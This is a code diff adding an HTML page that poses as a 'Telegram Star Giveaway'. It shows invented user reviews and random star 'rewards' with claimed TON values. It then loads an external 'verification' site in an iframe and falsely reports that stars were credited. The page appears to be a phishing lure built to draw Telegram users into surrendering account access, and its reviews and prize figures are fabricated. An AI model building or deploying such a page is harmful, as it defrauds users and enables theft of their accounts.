@@ -1,0 +1,987 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Star Giveaway</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0088cc, #2aabee);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            padding: 20px;
+        }
+
+        /* লোডিং স্টাইল */
+        .loader-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0088cc, #2aabee);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .loader {
+            width: 70px;
+            height: 70px;
+            position: relative;
+        }
+
+        .loader:before, .loader:after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            border: 5px solid transparent;
+            border-top-color: #ffd700;
+            animation: spin 1.5s linear infinite;
+        }
+
+        .loader:before {
+            top: 5px;
+            left: 5px;
+            right: 5px;
+            bottom: 5px;
+            border-top-color: #fff;
+            animation: spin 2s linear infinite;
+        }
+
+        .loader:after {
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            bottom: 15px;
+            border-top-color: #ffaa00;
+            animation: spin 1s linear infinite;
+        }
+
+        .loader-text {
+            margin-top: 20px;
+            font-size: 1.2rem;
+            color: white;
+            text-align: center;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+        }
+
+        .loader-progress {
+            width: 200px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            margin-top: 15px;
+            overflow: hidden;
+        }
+
+        .loader-progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, #ffd700, #ffaa00);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+
+        .container {
+            max-width: 900px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 50px;
+            margin-bottom: 15px;
+            color: #ffd700;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .stars-container {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+
+        .star {
+            font-size: 40px;
+            color: #ffd700;
+            margin: 0 10px;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
+            animation: float 3s ease-in-out infinite;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+
+        .star:hover {
+            transform: scale(1.3) rotate(15deg);
+        }
+
+        .star:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+
+        .star:nth-child(3) {
+            animation-delay: 1s;
+        }
+
+        .star:nth-child(4) {
+            animation-delay: 1.5s;
+        }
+
+        .star:nth-child(5) {
+            animation-delay: 2s;
+        }
+
+        .form-container {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 50px;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
+            text-align: center;
+            outline: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+            transform: scale(1.02);
+        }
+
+        button {
+            background: linear-gradient(to right, #ffd700, #ffaa00);
+            color: #333;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(to right, #ffaa00, #ffd700);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .prize-section {
+            margin: 30px 0;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+        }
+
+        .prize-title {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: #ffd700;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #ffd700;
+            opacity: 0;
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* ছবির স্টাইল */
+        .screenshot-container {
+            margin: 30px 0;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            position: relative;
+            background: rgba(0, 0, 0, 0.1);
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .screenshot-img {
+            width: 100%;
+            display: block;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .img-placeholder {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1rem;
+        }
+
+        /* Popup Styling */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup-content {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 0 50px rgba(255, 215, 0, 0.5);
+            animation: popIn 0.5s forwards;
+        }
+
+        .close-popup {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #ffd700;
+        }
+
+        .star-reward {
+            font-size: 5rem;
+            color: #ffd700;
+            margin: 20px 0;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            animation: glow 2s infinite;
+        }
+
+        .star-value {
+            font-size: 1.5rem;
+            margin: 10px 0;
+            color: #ffd700;
+        }
+
+        .verify-note {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 1rem;
+        }
+
+        /* Verification Page Styling */
+        .verification-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0088cc;
+            z-index: 2000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .verification-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .verification-logo {
+            font-size: 60px;
+            color: white;
+            margin-bottom: 15px;
+        }
+
+        .verification-content {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            color: #333;
+            text-align: center;
+        }
+
+        .verification-iframe {
+            width: 100%;
+            height: 400px;
+            border: none;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .verification-success {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: #34c759;
+            margin-bottom: 20px;
+        }
+
+        /* Reviews Section - Improved Design */
+        .reviews-section {
+            margin-top: 40px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+        }
+
+        .reviews-title {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: #ffd700;
+            text-align: center;
+        }
+
+        .review {
+            display: none;
+            padding: 20px;
+            margin: 20px 0;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 15px;
+            text-align: left;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-left: 4px solid #ffd700;
+        }
+
+        .review.active {
+            display: block;
+            animation: fadeIn 1s;
+        }
+
+        .review-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .review-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0088cc, #2aabee);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-weight: bold;
+            font-size: 1.2rem;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .review-info {
+            flex: 1;
+        }
+
+        .review-name {
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .review-time {
+            font-size: 0.8rem;
+            opacity: 0.7;
+            margin-top: 3px;
+        }
+
+        .review-stars {
+            color: #ffd700;
+            font-size: 1.1rem;
+        }
+
+        .review-text {
+            font-style: italic;
+            position: relative;
+            padding-left: 25px;
+            line-height: 1.6;
+            font-size: 1.05rem;
+        }
+
+        .review-text:before {
+            content: """;
+            font-size: 3.5rem;
+            position: absolute;
+            left: 0;
+            top: -20px;
+            color: rgba(255, 255, 255, 0.2);
+            font-family: Arial;
+        }
+
+        /* Improved Success Popup */
+        .success-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .success-content {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            width: 90%;
+            max-width: 450px;
+            padding: 40px 30px;
+            border-radius: 20px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 0 50px rgba(255, 215, 0, 0.6);
+            animation: popIn 0.5s forwards;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .success-icon-large {
+            font-size: 80px;
+            color: #ffd700;
+            margin: 15px 0;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            animation: pulse 2s infinite;
+        }
+
+        .success-title {
+            font-size: 2rem;
+            margin: 15px 0;
+            color: #ffd700;
+        }
+
+        .success-message {
+            font-size: 1.1rem;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .success-button {
+            background: linear-gradient(to right, #34c759, #30d158);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s;
+        }
+
+        .success-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(to right, #30d158, #34c759);
+        }
+
+        /* Animations */
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+
+        @keyframes glow {
+            0% { text-shadow: 0 0 5px rgba(255, 215, 0, 0.7); }
+            50% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.9); }
+            100% { text-shadow: 0 0 5px rgba(255, 215, 0, 0.7); }
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            p {
+                font-size: 1rem;
+            }
+            
+            .container {
+                padding: 20px;
+            }
+            
+            .star {
+                font-size: 30px;
+            }
+            
+            .star-reward {
+                font-size: 3rem;
+            }
+            
+            .verification-content {
+                padding: 20px;
+            }
+            
+            .review-avatar {
+                width: 40px;
+                height: 40px;
+                font-size: 1rem;
+            }
+            
+            .success-content {
+                padding: 30px 20px;
+            }
+            
+            .success-icon-large {
+                font-size: 60px;
+            }
+            
+            .success-title {
+                font-size: 1.7rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- লোডিং স্ক্রীন -->
+    <div class="loader-container" id="loader">
+        <div class="loader"></div>
+        <div class="loader-text">Loading Telegram Star Giveaway...</div>
+        <div class="loader-progress">
+            <div class="loader-progress-bar" id="progressBar"></div>
+        </div>
+    </div>
+
+    <div class="container" id="mainContent">
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-telegram"></i>
+            </div>
+            <h1>Telegram Star Giveaway</h1>
+            <p>Verify with your Telegram username and receive free stars! Each star has a ton value that can be redeemed for exciting prizes.</p>
+        </div>
+
+        <div class="stars-container">
+            <div class="star"><i class="fas fa-star"></i></div>
+            <div class="star"><i class="fas fa-star"></i></div>
+            <div class="star"><i class="fas fa-star"></i></div>
+            <div class="star"><i class="fas fa-star"></i></div>
+            <div class="star"><i class="fas fa-star"></i></div>
+        </div>
+
+        <div class="form-container">
+            <h2>Enter Your Telegram Username</h2>
+            <input type="text" id="username" placeholder="@username">
+            <button onclick="verifyUser()">Verify & Get Stars</button>
+        </div>
+
+        <!-- ছবির জন্য কন্টেইনার -->
+        <div class="screenshot-container">
+            <div class="img-placeholder" id="imgPlaceholder">Loading screenshot...</div>
+            <img src="https://i.ibb.co/WNW7T6Nv/Screenshot-20250820-000059.jpg" alt="Telegram Star Giveaway Screenshot" class="screenshot-img" id="screenshotImg" onload="imageLoaded()">
+        </div>
+
+        <div class="reviews-section">
+            <h2 class="reviews-title">What Our Users Say</h2>
+            <div class="review active">
+                <div class="review-header">
+                    <div class="review-avatar">JD</div>
+                    <div class="review-info">
+                        <div class="review-name">John Doe</div>
+                        <div class="review-time">15 minutes ago</div>
+                    </div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                </div>
+                <div class="review-text">I was skeptical at first, but I received 32 stars worth 24 TON! The verification process was quick and I was able to redeem them for Telegram Premium. Highly recommend!</div>
+            </div>
+            <div class="review">
+                <div class="review-header">
+                    <div class="review-avatar">SA</div>
+                    <div class="review-info">
+                        <div class="review-name">Sarah Anderson</div>
+                        <div class="review-time">2 hours ago</div>
+                    </div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star-half-alt"></i>
+                    </div>
+                </div>
+                <div class="review-text">This is the best Telegram star giveaway I've found! The interface is user-friendly and I got 45 stars (33.75 TON) on my first try. Already shared with my friends!</div>
+            </div>
+            <div class="review">
+                <div class="review-header">
+                    <div class="review-avatar">MJ</div>
+                    <div class="review-info">
+                        <div class="review-name">Mike Johnson</div>
+                        <div class="review-time">5 hours ago</div>
+                    </div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                </div>
+                <div class="review-text">I've tried multiple star giveaways, but this one is by far the most generous. Received 28 stars worth 21 TON instantly after verification. The whole process took less than a minute!</div>
+            </div>
+            <div class="review">
+                <div class="review-header">
+                    <div class="review-avatar">ER</div>
+                    <div class="review-info">
+                        <div class="review-name">Emma Roberts</div>
+                        <div class="review-time">1 day ago</div>
+                    </div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="far fa-star"></i>
+                    </div>
+                </div>
+                <div class="review-text">I got 38 stars (28.5 TON) which was enough for the exclusive sticker pack. The stars were credited immediately after verification. Will definitely use again!</div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 Telegram Star Giveaway. All rights reserved.</p>
+        </div>
+    </div>
+
+    <!-- Star Reward Popup -->
+    <div class="popup" id="starPopup">
+        <div class="popup-content">
+            <div class="close-popup" onclick="closePopup()">
+                <i class="fas fa-times"></i>
+            </div>
+            <h2>Congratulations!</h2>
+            <div class="star-reward">
+                <i class="fas fa-star"></i>
+            </div>
+            <div class="star-value" id="starAmount">25 Stars (18.75 TON)</div>
+            <p>You've received stars with ton value!</p>
+            
+            <div class="verify-note">
+                <p><strong>Important:</strong> To receive these stars in your Telegram account, you must verify your account by clicking the button below.</p>
+            </div>
+            
+            <button onclick="showVerificationPage()">Verify Telegram Account</button>
+        </div>
+    </div>
+
+    <!-- Verification Page -->
+    <div class="verification-page" id="verificationPage">
+        <div class="verification-header">
+            <div class="verification-logo">
+                <i class="fab fa-telegram"></i>
+            </div>
+            <h1 style="color: white;">Telegram Verification</h1>
+            <p style="color: rgba(255, 255, 255, 0.8);">Complete account verification to receive your stars</p>
+        </div>
+        
+        <div class="verification-content">
+            <h2 style="color: #0088cc;">Account Verification</h2>
+            <p>Please complete the verification process to receive your stars.</p>
+            
+            <div id="verificationIframeContainer">
+                <iframe src="about:blank" class="verification-iframe" id="verificationIframe"></iframe>
+            </div>
+            
+            <div style="margin-top: 20px;">
+                <button onclick="completeVerification()" style="background: #0088cc; width: 100%;">Continue</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Popup -->
+    <div class="success-popup" id="successPopup">
+        <div class="success-content">
+            <div class="success-icon-large">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2 class="success-title">Verification Complete!</h2>
+            <p class="success-message">Your Telegram account has been successfully verified. <span id="successStars">25 Stars (18.75 TON)</span> have been added to your account.</p>
+            <button class="success-button" onclick="closeSuccessPopup()">Continue</button>
+        </div>
+    </div>
+
+    <script>
+        // লোডিং এবং ছবি লোডিং ফাংশন
+        let imageLoadedFlag = false;
+        let contentLoadedFlag = false;
+        const progressBar = document.getElementById('progressBar');
+        const loader = document.getElementById('loader');
+        const mainContent = document.getElementById('mainContent');
+        const imgPlaceholder = document.getElementById('imgPlaceholder');
+        const screenshotImg = document.getElementById('screenshotImg');
+        
+        // প্রোগ্রেস বার আপডেট ফাংশন
+        function updateProgress(percent) {
+            progressBar.style.width = percent + '%';
+        }
+        
+        // ছবি লোড হওয়ার পর
+        function imageLoaded() {
+            imageLoadedFlag = true;
+            screenshotImg.style.opacity = '1';
+            imgPlaceholder.style.display = 'none';
+            updateProgress(100);
+            checkAllLoaded();
+        }
+        
+        // সবকিছু লোড হয়েছে কিনা চেক করা
+        function checkAllLoaded() {
+            if (imageLoadedFlag && contentLoadedFlag) {
+                setTimeout(() => {
+                    loader.style.opacity = '0';
+                    setTimeout(() => {
+                        loader.style.display = 'none';
+                        mainContent.style.opacity = '1';
+                        mainContent.style.transform = 'translateY(0)';
+                    }, 500);
+                }, 500);
+            }
+        }
+        
+        // ছবি লোড হতে সমস্যা হলে
+        screenshotImg.onerror = function() {
+            imgPlaceholder.textContent = 'Image failed to load';
+            imageLoadedFlag = true;
+            updateProgress(100);
+            checkAllLoaded();
+        };
+        
+        // DOM কন্টেন্ট লোড হওয়ার পর
+        document.addEventListener('DOMContentLoaded', function() {
+            // কন্টেন্ট লোড হয়েছে
+            contentLoadedFlag = true;
+            updateProgress(50);
+            
+            // যদি ছবি আগেই লোড হয়ে যায়
+            if (screenshotImg.complete && screenshotImg.naturalHeight !== 0) {
+                imageLoaded();
+            }
+            
+            // স্টার এনিমেশন
+            const stars = document.querySelectorAll('.star');
+            stars.forEach((star, index) => {
+                star.style.animationDelay = (index * 0.3) + 's';
+            });
+            
+            // রিভিউ রোটেশন
+            let currentReview = 0;
+            const reviews = document.querySelectorAll('.review');
+            
+            function rotateReviews() {
+                reviews[currentReview].classList.remove('active');
+                currentReview = (currentReview + 1) % reviews.length;
+                reviews[currentReview].classList.add('active');
+            }
+            
+            // রিভিউ রোটেশন শুরু
+            setInterval(rotateReviews, 5000);
+        });
+        
+        // Verification function
+        function verifyUser() {
+            const username = document.getElementById('username').value.trim();
+            
+            if (!username) {
+                alert('Please enter your Telegram username');
+                return;
+            }
+            
+            if (!username.startsWith('@')) {
+                alert('Username must start with @');
+                return;
+            }
+            
+            // Animation and confetti effects
+            createConfetti();
+            
+            // Show star reward popup
+            setTimeout(() => {
+                showStarPopup();
+            }, 1000);
+        }
+        
+        // Show star popup function
+        function showStarPopup() {
+            const popup = document.getElementById('starPopup');
+            const starAmount = document.getElementById('starAmount');
+            
+            // Random star count (5-50)
+            const stars = Math.floor(Math.random() * 46) + 5;
+            // Current Telegram star rate: 1 Star = 0.75 TON
+            const tonValue = stars * 0.75;
+            
+            starAmount.textContent = `${stars} Stars (${tonValue.toFixed(2)} TON)`;
+            popup.style.display = 'flex';
+        }
+        
+        // Close popup function
+        function closePopup() {
+            document.getElementById('starPopup').style.display = 'none';
+        }
+        
+        // Show verification page
+        function showVerificationPage() {
+            document.getElementById('verificationPage').style.display = 'flex';
+            document.getElementById('starPopup').style.display = 'none';
+            
+            // Load your website in the iframe
+            document.getElementById('verificationIframe').src = 'https://verify-tg.onrender.com/';
+        }
+        
+        // Complete verification
+        function completeVerification() {
+            document.getElementById('verificationPage').style.display = 'none';
+            
+            // Show success popup with the star amount
+            const starAmount = document.getElementById('starAmount').textContent;
+            document.getElementById('successStars').textContent = starAmount;
+            document.getElementById('successPopup').style.display = 'flex';
+        }
+        
+        // Close success popup
+        function closeSuccessPopup() {
+            document.getElementById('successPopup').style.display = 'none';
+        }
+        
+        // Confetti animation function
+        function createConfetti() {
+            const container = document.querySelector('.container');
+            const colors = ['#ffd700', '#ffaa00', '#ff7700', '#ff5500', '#ff3300'];
+            
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.top = -20 + 'px';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.width = (5 + Math.random() * 10) + 'px';
+                confetti.style.height = (5 + Math.random() * 10) + 'px';
+                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
+                container.appendChild(confetti);
+                
+                // Animation
+                const animation = confetti.animate([
+                    { top: '-20px', opacity: 1, transform: 'rotate(0deg)' },
+                    { top: '100%', opacity: 0, transform: 'rotate(' + (Math.random() * 360) + 'deg)' }
+                ], {
+                    duration: 1000 + Math.random() * 2000,
+                    easing: 'cubic-bezier(0.1, 0.8, 0.9, 0.1)'
+                });
+                
+                animation.onfinish = () => {
+                    confetti.remove();
+                };
+            }
+        }
+    </script>
+</body>
+</html>
